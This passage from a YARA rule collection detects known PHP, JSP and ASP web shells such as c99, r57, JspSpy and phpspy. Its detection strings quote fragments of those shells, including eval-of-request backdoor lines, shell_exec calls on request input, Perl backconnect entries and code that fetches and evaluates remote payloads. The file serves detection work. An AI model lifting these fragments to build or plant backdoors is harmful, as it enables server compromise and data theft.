        category = "INFO"
        super_rule = 1
        hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
        hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
        hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
        hash3 = "048ccc01b873b40d57ce25a4c56ea717"

    strings:
        $s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
        $s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
        $s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
        $s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
        $s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
        $s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
    condition:
        2 of them
}
rule webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
    meta:
        id = "16x7fXMm2RGQkRx2qwwei4"
        fingerprint = "v1_sha256_522ba5f797e33c27fef3ae8d89889c31799073ed3c770a49401f4d42ead04640"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "b330a6c2d49124ef0729539761d6ef0b"
        hash1 = "d71716df5042880ef84427acee8b121e"
        hash2 = "344f9073576a066142b2023629539ebd"
        hash3 = "32dea47d9c13f9000c4c807561341bee"
        hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
        hash5 = "3ea688e3439a1f56b16694667938316d"
        hash6 = "2434a7a07cb47ce25b41d30bc291cacc"

    strings:
        $s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
        $s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
        $s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
        $s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
    condition:
        2 of them
}
rule webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend {
    meta:
        id = "5M3Q4dxwgkLJatCzotXwe9"
        fingerprint = "v1_sha256_7ca710973592718c5455508c5798b3c51dce994d5ebd33aa3a59d1b03c096bdf"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
        hash1 = "059058a27a7b0059e2c2f007ad4675ef"
        hash2 = "8b457934da3821ba58b06a113e0d53d9"
        hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
        hash4 = "e0354099bee243702eb11df8d0e046df"
        hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
        hash6 = "655722eaa6c646437c8ae93daac46ae0"
        hash7 = "591ca89a25f06cf01e4345f98a22845c"

    strings:
        $s0 = "return new Double(format.format(value)).doubleValue();" fullword
        $s5 = "File tempF = new File(savePath);" fullword
        $s9 = "if (tempF.isDirectory()) {" fullword
    condition:
        2 of them
}
rule webshell_c99_c99shell_c99_c99shell {
    meta:
        id = "22SyBw8l7xXZfRBAJErUu2"
        fingerprint = "v1_sha256_b999b1a8307e228fb97772799369e292fb806d614159f2b2abfc7a71c5bdb225"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
        category = "INFO"
        super_rule = 1
        hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
        hash1 = "d3f38a6dc54a73d304932d9227a739ec"
        hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
        hash3 = "048ccc01b873b40d57ce25a4c56ea717"

    strings:
        $s2 = "$bindport_pass = \"c99\";" fullword
        $s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
    condition:
        1 of them
}
rule webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
    meta:
        id = "ftISmkxbUG75sFKeSWKdZ"
        fingerprint = "v1_sha256_23887963068f7dd2e4c85b11079276a00786d1a753f22e3b63f01139087a7f4c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
        category = "INFO"
        super_rule = 1
        hash0 = "ae025c886fbe7f9ed159f49593674832"
        hash1 = "513b7be8bd0595c377283a7c87b44b2e"
        hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
        hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
        hash4 = "3f71175985848ee46cc13282fbed2269"

    strings:
        $s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
        $s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
        $s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
        $s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
    condition:
        2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx {
    meta:
        id = "ZMQAHdMpqzLM3rL7YuYwT"
        fingerprint = "v1_sha256_b10e89c6b1851f88a2bbb9116969ea3770366c162b911cb8a2c3a033da3a46bc"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
        category = "INFO"
        super_rule = 1
        hash0 = "0b19e9de790cd2f4325f8c24b22af540"
        hash1 = "4745d510fed4378e4b1730f56f25e569"
        hash2 = "f3ca29b7999643507081caab926e2e74"
        hash3 = "46a18979750fa458a04343cf58faa9bd"

    strings:
        $s3 = "BODY, TD, TR {" fullword
        $s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
        $s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
    condition:
        2 of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
    meta:
        id = "7fM2YXvdOskBw9yfZ30zu1"
        fingerprint = "v1_sha256_46eede3a1af29e344ed5107fc0af4bd13cd1492bff340d61063911bbb474e7b3"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
        hash1 = "059058a27a7b0059e2c2f007ad4675ef"
        hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
        hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
        hash4 = "8b457934da3821ba58b06a113e0d53d9"
        hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
        hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
        hash7 = "14e9688c86b454ed48171a9d4f48ace8"
        hash8 = "b330a6c2d49124ef0729539761d6ef0b"
        hash9 = "d71716df5042880ef84427acee8b121e"
        hash10 = "341298482cf90febebb8616426080d1d"
        hash11 = "29aebe333d6332f0ebc2258def94d57e"
        hash12 = "42654af68e5d4ea217e6ece5389eb302"
        hash13 = "88fc87e7c58249a398efd5ceae636073"
        hash14 = "4a812678308475c64132a9b56254edbc"
        hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
        hash16 = "e0354099bee243702eb11df8d0e046df"
        hash17 = "344f9073576a066142b2023629539ebd"
        hash18 = "32dea47d9c13f9000c4c807561341bee"
        hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
        hash20 = "655722eaa6c646437c8ae93daac46ae0"
        hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
        hash22 = "6acc82544be056580c3a1caaa4999956"
        hash23 = "6aa32a6392840e161a018f3907a86968"
        hash24 = "591ca89a25f06cf01e4345f98a22845c"
        hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
        hash26 = "3ea688e3439a1f56b16694667938316d"
        hash27 = "ab77e4d1006259d7cbc15884416ca88c"
        hash28 = "71097537a91fac6b01f46f66ee2d7749"
        hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
        hash30 = "7a4b090619ecce6f7bd838fe5c58554b"

    strings:
        $s3 = "String savePath = request.getParameter(\"savepath\");" fullword
        $s4 = "URL downUrl = new URL(downFileUrl);" fullword
        $s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
        $s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
        $s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
        $s8 = "URLConnection conn = downUrl.openConnection();" fullword
        $s9 = "sis = request.getInputStream();" fullword
    condition:
        4 of them
}
rule webshell_2_520_icesword_job_ma1 {
    meta:
        id = "654JclpKVN0O47jKC76VV2"
        fingerprint = "v1_sha256_795eb586310d87a3c6b53117bf2c8cbcfadcb177f5a5129c17fd21f0b64c385c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "64a3bf9142b045b9062b204db39d4d57"
        hash1 = "9abd397c6498c41967b4dd327cf8b55a"
        hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
        hash3 = "56c005690da2558690c4aa305a31ad37"
        hash4 = "532b93e02cddfbb548ce5938fe2f5559"

    strings:
        $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
        $s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
        $s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
    condition:
        2 of them
}
rule webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
    meta:
        id = "P5CMnmJlYor6iNy7r1CKV"
        fingerprint = "v1_sha256_5e0da29499d76539fb1f5cfbe0a00331eeb0bb8fa861f2e2d686130ee4939fac"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "7066f4469c3ec20f4890535b5f299122"
        hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
        hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
        hash3 = "8979594423b68489024447474d113894"
        hash4 = "ec482fc969d182e5440521c913bab9bd"
        hash5 = "f98d2b33cd777e160d1489afed96de39"
        hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
        hash7 = "e9a5280f77537e23da2545306f6a19ad"

    strings:
        $s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
        $s2 = " KB </td>" fullword
        $s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
        $s4 = "<!-- <tr align=\"center\"> " fullword
    condition:
        all of them
}

rule webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
    meta:
        id = "6apKWX2TwP0jURXP9DFBZy"
        fingerprint = "v1_sha256_fc47a50c5964574fb9b9caf3fb94041f028998577bf4ccf21884a41fa1876572"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
        category = "INFO"
        super_rule = 1
        hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
        hash1 = "42f211cec8032eb0881e87ebdb3d7224"
        hash2 = "40a1f840111996ff7200d18968e42cfe"
        hash3 = "0712e3dc262b4e1f98ed25760b206836"

    strings:
        $s4 = "http://www.4ngel.net" fullword
        $s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
        $s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
        $s9 = "Codz by Angel" fullword
    condition:
        2 of them
}
rule webshell_c99_locus7s_c99_w4cking_xxx {
    meta:
        id = "C6qEtrPgvRQbjRNtPFZ1I"
        fingerprint = "v1_sha256_4afadac41e729f77711eb3ea3ee8f6e8ce61e19294e90db024e5334e214d9647"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files c99_locus7s.php, c99_w4cking.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, acid.php, newsh.php, r57.php, Backdoor.PHP.Agent.php"
        category = "INFO"
        super_rule = 1
        hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
        hash1 = "9c34adbc8fd8d908cbb341734830f971"
        hash2 = "ef43fef943e9df90ddb6257950b3538f"
        hash3 = "ae025c886fbe7f9ed159f49593674832"
        hash4 = "911195a9b7c010f61b66439d9048f400"
        hash5 = "697dae78c040150daff7db751fc0c03c"
        hash6 = "513b7be8bd0595c377283a7c87b44b2e"
        hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
        hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
        hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
        hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
        hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
        hash12 = "41af6fd253648885c7ad2ed524e0692d"
        hash13 = "6fcc283470465eed4870bcc3e2d7f14d"

    strings:
        $s1 = "$res = @shell_exec($cfe);" fullword
        $s8 = "$res = @ob_get_contents();" fullword
        $s9 = "@exec($cfe,$res);" fullword
    condition:
        2 of them
}
rule webshell_browser_201_3_ma_ma2_download {
    meta:
        id = "h4SjbSMCXW8N0gAXBhuLD"
        fingerprint = "v1_sha256_3b8bb6ca2eb146f8c170d629612ba12d4663445d443b681f2859af25d50ab6fe"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "37603e44ee6dc1c359feb68a0d566f76"
        hash1 = "a7e25b8ac605753ed0c438db93f6c498"
        hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
        hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
        hash4 = "4b45715fa3fa5473640e17f49ef5513d"
        hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"

    strings:
        $s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
        $s2 = "private static String tempdir = \".\";" fullword
        $s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
    condition:
        2 of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010 {
    meta:
        id = "4FXSneFVyPDc4L8JN1TPAS"
        fingerprint = "v1_sha256_dd01bb059d741fedaee17d46355c7cd8a845d714b20ae37db36424544b954d2f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
        hash1 = "059058a27a7b0059e2c2f007ad4675ef"
        hash2 = "8b457934da3821ba58b06a113e0d53d9"
        hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
        hash4 = "655722eaa6c646437c8ae93daac46ae0"

    strings:
        $s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
        $s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
        $s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
    condition:
        2 of them
}
rule webshell_r57shell127_r57_kartal_r57 {
    meta:
        id = "1D6KPknpeatrkSgqBn7nHW"
        fingerprint = "v1_sha256_fd849f76f8348ee57a9c96eed91c8cac416fdc45a08c93e93ebc952375de27a3"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
        category = "INFO"
        super_rule = 1
        hash0 = "ae025c886fbe7f9ed159f49593674832"
        hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
        hash2 = "4108f28a9792b50d95f95b9e5314fa1e"

    strings:
        $s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
        $s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
        $s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
    condition:
        2 of them
}

rule webshell_webshells_new_con2 {
    meta:
        id = "6ljNNBG4rXonpv4YSVjeT4"
        fingerprint = "v1_sha256_c681b04a1ee4d6af3275b6d772ef35f8bc888a5fcaf3b84f29f77c264e8ad9b9"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file con2.asp"
        category = "INFO"
        hash = "d3584159ab299d546bd77c9654932ae3"

    strings:
        $s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
        $s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
    condition:
        1 of them
}
rule webshell_webshells_new_make2 {
    meta:
        id = "6l4r6yLLmJjsW98Ox6Nkq2"
        fingerprint = "v1_sha256_7c94c925b5fd7fbc37428c21a9ea3c5a73f4fa0a20a1f5d03f0d5a990bd6f45a"
        version = "1.0"
        score = 50
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file make2.php"
        category = "INFO"
        hash = "9af195491101e0816a263c106e4c145e"

    strings:
        $s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
    condition:
        all of them
}
rule webshell_webshells_new_aaa {
    meta:
        id = "5HkJjiuPKX0yNOaeSRzLV0"
        fingerprint = "v1_sha256_3c5b9dd86dc790b03a8540b2fb3a717c5ad17d34f366a319faa127479387eed9"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file aaa.asp"
        category = "INFO"
        hash = "68483788ab171a155db5266310c852b2"

    strings:
        $s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
        $s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
        $s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
    condition:
        1 of them
}
rule webshell_Expdoor_com_ASP {
    meta:
        id = "7Ijr1btylFc5OXsvqGfq8r"
        fingerprint = "v1_sha256_838edb9d718b5e1a8be155c4569b4a291b37337e71b435c2b1cd6bcaa53c0dea"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file Expdoor.com ASP.asp"
        category = "INFO"
        hash = "caef01bb8906d909f24d1fa109ea18a7"

    strings:
        $s4 = "\">www.Expdoor.com</a>" fullword
        $s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
        $s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
        $s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
        $s16 = "<TITLE>Expdoor.com ASP" fullword
    condition:
        2 of them
}
rule webshell_webshells_new_php2 {
    meta:
        id = "Rz7ecsniAGnYCOggEwEjM"
        fingerprint = "v1_sha256_0350df076a25af77fbd8d5db2b38438a10cd5b9237b23b2f64c6360607b41982"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file php2.php"
        category = "INFO"
        hash = "fbf2e76e6f897f6f42b896c855069276"

    strings:
        $s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
    condition:
        all of them
}
rule webshell_bypass_iisuser_p {
    meta:
        id = "63aoGjhQA4NKRBKG7XoZZa"
        fingerprint = "v1_sha256_60d0609291e5def26ce949c903ac767db4157b4f9cf4eee315c69ee7a8d8e77b"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file bypass-iisuser-p.asp"
        category = "INFO"
        hash = "924d294400a64fa888a79316fb3ccd90"

    strings:
        $s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
    condition:
        all of them
}
rule webshell_sig_404super {
    meta:
        id = "5gu6mjhJlnfeBvcAIOGD6j"
        fingerprint = "v1_sha256_01ecffc6bca2acf1ea4f4d965f3513f7b08ee3d5abbda29d53081f2931ecf9e9"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file 404super.php"
        category = "INFO"
        hash = "7ed63176226f83d36dce47ce82507b28"

    strings:
        $s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
        $s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
        $s7 = "//http://require.duapp.com/session.php" fullword
        $s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
        $s12 = "//define('pass','123456');" fullword
        $s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
    condition:
        1 of them
}
rule webshell_webshells_new_JSP {
    meta:
        id = "3VYWX9zWulXfEeoGCfvTTd"
        fingerprint = "v1_sha256_bcb2f5d16ff3cc1454bf4653defe037e02a9228a5b7cf7428b1a577f4207c3c8"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file JSP.jsp"
        category = "INFO"
        hash = "495f1a0a4c82f986f4bdf51ae1898ee7"

    strings:
        $s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
        $s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
        $s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
    condition:
        1 of them
}
rule webshell_webshell_123 {
    meta:
        id = "3y87B24q6kZJU9VNsE5KHS"
        fingerprint = "v1_sha256_a16a8ed7329ba7d34dc2e174aca5a24643e8a5d1dbf459d41a82f516f7c79549"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file webshell-123.php"
        category = "INFO"
        hash = "2782bb170acaed3829ea9a04f0ac7218"

    strings:
        $s0 = "// Web Shell!!" fullword
        $s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
        $s3 = "$default_charset = \"UTF-8\";" fullword
        $s4 = "// url:http://www.weigongkai.com/shell/" fullword
    condition:
        2 of them
}
rule webshell_dev_core {
    meta:
        id = "3GJlLBeUs9Ar3glbwZtZQZ"
        fingerprint = "v1_sha256_b3c7a9bdaa7e5bf76df9ffba94157777c32199edeaa1c8745e9400d138abc267"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file dev_core.php"
        category = "INFO"
        hash = "55ad9309b006884f660c41e53150fc2e"

    strings:
        $s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
        $s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
        $s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
        $s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
        $s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
        $s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
    condition:
        1 of them
}
rule webshell_webshells_new_pHp {
    meta:
        id = "5Y2avQSkvrEhOqIOj5TkY2"
        fingerprint = "v1_sha256_a943f3b0d1d56194e250c7cf3e05b2bfec7b29f91ef56085d645efa3fe8995c9"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file pHp.php"
        category = "INFO"
        hash = "b0e842bdf83396c3ef8c71ff94e64167"

    strings:
        $s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
        $s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
        $s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
        $s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
        $s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
    condition:
        1 of them
}
rule webshell_webshells_new_pppp {
    meta:
        id = "29AL5zrm5fFswbD3eNLiIQ"
        fingerprint = "v1_sha256_bd09fc2ec88bea83b16e63afafa3d5f74f119a81046a663322f5b396b48da135"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file pppp.php"
        category = "INFO"
        hash = "cf01cb6e09ee594545693c5d327bdd50"

    strings:
        $s0 = "Mail: chinese@hackermail.com" fullword
        $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
        $s6 = "Site: http://blog.weili.me" fullword
    condition:
        1 of them
}
